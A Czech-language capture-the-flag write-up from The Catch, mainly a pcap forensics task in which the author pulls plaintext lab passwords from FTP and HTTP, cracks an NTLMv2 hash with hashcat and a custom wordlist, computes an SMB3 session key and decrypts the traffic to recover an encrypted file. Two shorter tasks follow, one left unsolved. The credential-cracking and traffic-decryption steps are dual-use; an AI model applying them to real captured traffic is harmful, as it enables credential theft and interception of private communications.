> the chief security officer has told you, he came across a very suspicious
> event in ship's security logs on the occasion of a planned monthly log check.
> The event is related to accessing the secret file secret.db on server on cargo
> deck. Luckily, the ship is equipped with an automatic network traffic
> recorder, which was activated by the suspicious event and provided
> corresponding packet capture. Your task is to confirm that the mentioned file
> has been exfiltrated and to examine its contents.
>
> May you have fair winds and following seas!
>
> Download the [pcap](https://owncloud.cesnet.cz/index.php/s/GrNNG2i6GifsWdn/download).

Toto byla úloha, která se mi z celého letošního The Catch líbila nejvíce. Krásně
samonosná v tom, že všechno, co člověk potřebuje, je ukryté uvnitř jednoho
pcap souboru :)

Pojďme se ale do staženého pcapu pomocí [Wiresharku](https://www.wireshark.org/)
podívat. Prostým koukáním nalezneme několik zajímavých věcí, rozeberme si je po
protokolech:

DNS:
* Můžeme zjistit IP některých strojů v síti:
  * smbserver1 -> 172.20.0.2
  * smbserver2 -> 172.20.0.6
  * webserver -> 172.20.0.3
* Hodně DNS dotazů na `_kerberos._udp.LOCAL.TCC`, `_kerberos._tcp.LOCAL.TCC`,
  `_kerberos._http.LOCAL.TCC` a taky `kerberos.LOCAL.TCC` s odpověďmi "no such server"

HTTP:
* Ke konci pcapu je pár HTTP requestů na 172.20.0.3 na `/admin` endpoint
  s HTTP basic autorizací `admin:james.f0r.HTTP.4648507`

SMB:
* Je zde několik nešifrovaných spojení
  * Dá se z nich vytáhnout soubor [`history.db`](18_Suspicious_traffic/history.db)
    a [`employees.db`](18_Suspicious_traffic/employees.db), Wireshark umí soubory
    přímo uložit
  * Oba soubory jsou poslané několikrát, ale podle md5sum jsou všechny verze stejné
  * Oba soubory jsou SQLite databáze, bohužel nic zajímavého v nich
* Je tam SMB3 encrypted komunikace – do té se neumíme bez hesla dostat
  * Vykoukáme z toho jen, že ji inicioval `james_admin`

FTP:
* Vidíme heslo v plaintextu `james.f0r.FTP.3618995`
* Používá se PORT command = druhá strana si requestne soubor z daného portu, což
  trochu mate Wireshark – je potřeba označit komunikaci z daného portu za
  FTP-data, pak už ji Wireshark zobrazí správně
* Jde vytáhnout [`home.tgz`](18_Suspicious_traffic/home.tgz) a rozbalit, je to
  home nějakého uživatele
  * Když projdeme `.bash_history`, tak objevíme command s heslem
    ```sh
    openssl enc -aes-256-cbc -salt -pbkdf2 -in secret.db -out secret.db.enc -k R3alyStr0ngP4ss!
    ```
  * Takže teď už jenom získat secret.db.enc, v `home.tgz` bohužel není
* Jde najít i [`etc.tgz`](18_Suspicious_traffic/etc.tgz)
  * Dost souborů bylo změněno 8. září, ale není v nich nic zajímavého (žádná hesla k SMB)

Když z toho uděláme nějaký závěr, tak na síti hodně komunikoval nějaký `james`,
který používá docela pravidelný pattern pro hesla: `james.f0r.<služba>.<číslo>`.
Povedlo se nám dekódovat a nějak přečíst skoro vše, co na síti proběhlo, vyjma
té jedné šifrované SMB komunikace iniciované uživatelem `james_admin`.

#### Dešifrování SMB komunikace

Vydal jsem se zkoumat, jak se dá zpětně dešifrovat SMB komunikace a náhodou jsem
našel skvělý popis v článku [Decrypting SMB3 Traffic with just a PCAP? Absolutely (maybe.)](https://medium.com/maverislabs/decrypting-smb3-traffic-with-just-a-pcap-absolutely-maybe-712ed23ff6a2),
díky kterému jsem zjistil, že Wireshark mi komunikaci umí dešifrovat, pokud
dostane *session key* pro danou komunikaci. A *session key* se dá spočítat
z toho, co si protistrany vyměnily při úvodním handshake a z hesla, to je dobrá
zpráva (není zde žádný [Diffie-Hellman](https://cs.wikipedia.org/wiki/Diffieho%E2%80%93Hellmanova_v%C3%BDm%C4%9Bna_kl%C3%AD%C4%8D%C5%AF)
ani nic podobného).

Navazování komunikace probíhá v kostce takto:
* Klient a server navážou TCP spojení a vymění si, co kdo umí
* Server pošle `NTLM server challenge`
* Klient odpoví a pošle:
  * username
  * doménu
  * `NTProofStr` a zbytek `NTLMv2 response`
  * zakódovaný session key

Podle výše zmíněného článku jsem si pořídil skript [`compute_samba_session_key.py`](18_Suspicious_traffic/compute_samba_session_key.py)
na výpočet session key k dešifrování komunikace. Skript potřebuje:

* `user`– uživatelské jméno, v našem případě vyčteme z komunikace `james_admin`
* `domain` – doménové jméno, opět vyčteme z komunikace `LOCAL.TCC`
* `password` – heslo uživatele, **to neznáme**
* `ntproofstr` – lze vyčíst z komunikace (`8bc34ae8e76fe9b8417a966c2f632eb4`)
* `key` — zakódovaný session key, lze vyčíst z komunikace (`4292dac3c7a0510f8b26c969e1ef0db9`)

#### Crackování NTLM hesla

Jediné, co nám schází, je heslo. Můžeme odhadnout, že bude mít klasický tvar
`james.f0r.SMB.<číslo>` nebo `james_admin.f0r.SMB.<číslo>`.

Pak prozkoumáme článek o [crackování NTLMv2 hashe na 801 Labs](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
a podle něj použijeme [`hashcat`](https://hashcat.net/hashcat/), což je utilita
na velmi rychlé crackování hesla. Hesla může zkoušet úplně náhodně, ale při naší
odhadované délce hesla to je již příliš. Můžeme si ale pořídit generátor na
odhadnutý tvar hesla (viz [`gen_passwordlist.py`](18_Suspicious_traffic/gen_passwordlist.py))
a pak nechat `hashcat` hesla velmi rychle vyzkoušet.

Z komunikace vytáhneme tato data:

```
Username: james_admin
Domain: LOCAL.TCC
NTLM server challenge: 78c8f4fdf5927e58
NTProofStr: 8bc34ae8e76fe9b8417a966c2f632eb4
NTLMv2 response (without NtProofStr): 01010000000000003ab4fc1550e2d901b352a9763bdec89a00000000020018004100360037004600320042004100340045003800460032000100180041003600370046003200420041003400450038004600320004000200000003001800610036003700660032006200610034006500380066003200070008003ab4fc1550e2d901060004000200000008003000300000000000000000000000000000002581558b8f3cf059f3661e7cb3af60d9b63a7561b7f48607589fb37e551862b10a0010000000000000000000000000000000000009001e0063006900660073002f0073006d006200730065007200760065007200320000000000
```

Z nich pro `hashcat` vytvoříme soubor [`crackme.txt`](18_Suspicious_traffic/crackme.txt)
ve správném formátu a pak spustíme (`-m 5600` je typ pro NTLM hesla).

```sh
$ ./gen_passwordlist.py | hashcat -m 5600 crackme.txt`
# -> Crackneme `james_admin.f0r.SMB.8089078`
```

Máme heslo! Spustíme připravený skript a získáme random session key:

```sh
$ ./compute_samba_session_key.py -v --user james_admin --domain LOCAL.TCC --password "james_admin.f0r.SMB.8089078" --ntproofstr "8bc34ae8e76fe9b8417a966c2f632eb4" --key "4292dac3c7a0510f8b26c969e1ef0db9"
PASS HASH: 7cf87b641c657bf9e3f75d93308e6db3
RESP NT:   a154f31a5ecc711694c3e0d064bac78e
NT PROOF:  8bc34ae8e76fe9b8417a966c2f632eb4
KeyExKey:  6a1d3b41cdf3d40f15a6c15b80d567d0
Random SK: 7a93dee25de4c2141657e7037dddb8f1
```

Vložíme `7a93dee25de4c2141657e7037dddb8f1` do Wiresharku pro ID komunikace `49b136b900000000` a voilà… Decrypted!
Uložíme si z komunikace [`secret.db.enc`](18_Suspicious_traffic/secret.db.enc)
a pak ji dekódujeme:

```sh
openssl enc -d -aes-256-cbc -pbkdf2 -in secret.db.enc -out secret.db -k R3alyStr0ngP4ss!
```

V SQLite databázi najdeme `FLAG{5B9B-lwPy-OfRS-4uEN}`. Velmi pěkná úloha, děkuji autorům :)

## Miscellaneous

### Naval chef's recipe (2/2 bodů)

> Ahoy, officer,
>
> some of the crew started behaving strangely after eating the chef's speciality
> of the day - they apparently have hallucinations, because they are talking
> about sirens wailing, kraken on starboard, and accussed the chef being
> reptilian spy. Paramedics are getting crazy, because the chef refuses to
> reveal what he used to make the food. Your task is to find his secret recipe.
> It should be easy as the chef knows only security by obscurity and he has
> registered domain `chef-menu.galley.cns-jv.tcc`. May you have fair winds and
> following seas!
>
> The chef's domain is `chef-menu.galley.cns-jv.tcc`.

Jedna z velmi jednoduchých úloh na rozjezd, stačí se podívat na stránku před
přesměrováním:

```sh
$ curl -s http://chef-menu.galley.cns-jv.tcc
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
  <title>301 Moved Permanently</title>
  <meta http-equiv="refresh" content="0;url=https://chef-menu.galley.cns-jv.tcc">
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="https://chef-menu.galley.cns-jv.tcc">here</a>.</p>
<p style="display: none">The secret ingredient is composed of C6H12O6, C6H8O6, dried mandrake, FLAG{ytZ6-Pewo-iZZP-Q9qz}, and C20H25N3O. Shake, do not mix.</p>
<script>window.location.href='https://chef-menu.galley.cns-jv.tcc'</script>
</body></html>
```

Vlajka `FLAG{ytZ6-Pewo-iZZP-Q9qz}` na nás přímo trčí :)

Jinak hlavní důvod divného chování posádky bude pravděpodobně C20H25N3O, což
je sumární vzorec pro [Diethylamid kyseliny lysergové](https://cs.wikipedia.org/wiki/Diethylamid_kyseliny_lysergov%C3%A9) aneb LSD,
další ingredience pak vypadají na mandragoru, glukózu a vitamín C (i když podle
sumárních vzorců se to těžko určuje s jistotou).

### Arkanoid (0/5 bodů)

> Ahoy, officer,
>
> a new server with a video game is to be placed in the ship's relaxation center
> . Your task is to check whether the server does not contain any
> vulnerabilities.
>
> May you have fair winds and following seas!
>
> The game server has domain name `arkanoid.cns-jv.tcc`.

Za mě nejtěžší úloha letošního The Catch, protože se mi ji nepovedlo vyřešit.
Doporučuji podívat se na writeup někoho úspěšnějšího.

Mě se povedlo jen zjistit, že na zadaném serveru je otevřených několik TCP
portů:

```sh
nmap -p- arkanoid.cns-jv.tcc
PORT      STATE SERVICE
8000/tcp  open  http-alt
43709/tcp open  unknown
60001/tcp open  unknown
60002/tcp open  unknown
```

S tím, že port 43709 se mění, viděno i 36455 a 39065. Zbylé jsou stabilní.

Na portu 8000 běží [jednoduchý web](http://arkanoid.cns-jv.tcc:8000/) s hrou. Po
přeformátování Javascriptu přesně odpovídá Javascriptu z návodu na
[2D Breakout game pure Javascript](https://developer.mozilla.org/en-US/docs/Games/Tutorials/2D_Breakout_game_pure_JavaScript)
s minimálním diffem ([skript z webu](21_Arkanoid/script.js), [originální MDN skript](21_Arkanoid/script_mdn_original.js)):

```diff
$ diff script_mds_original.js script.js
67,68c67,70
<                         alert("YOU WIN, CONGRATS!");
<                         document.location.reload();
---
>                         fetch("/score?data="+score).then(response => response.json()).then(data => {
>                             console.log(data);
>                             alert(data.message);
>                         }).catch(error => { console.error('Error:', error); });
```

Z hlaviček šlo vytáhnout, že web běží na Javě (`X-server: Java/1.8.0_144`).

Zkoušel jsem i posílat různé requesty na endpoint `http://arkanoid.cns-jv.tcc:8000/score?data=123`.
Odezva žádná, jen jsem zvládl vyvolat odpověď 400 Bad Request s textem `URISyntaxException`,
když jsem poslal `{` nebo `\`.

Více se mi bohužel zjisti nepovedlo a zde jsem s řešením skončil.
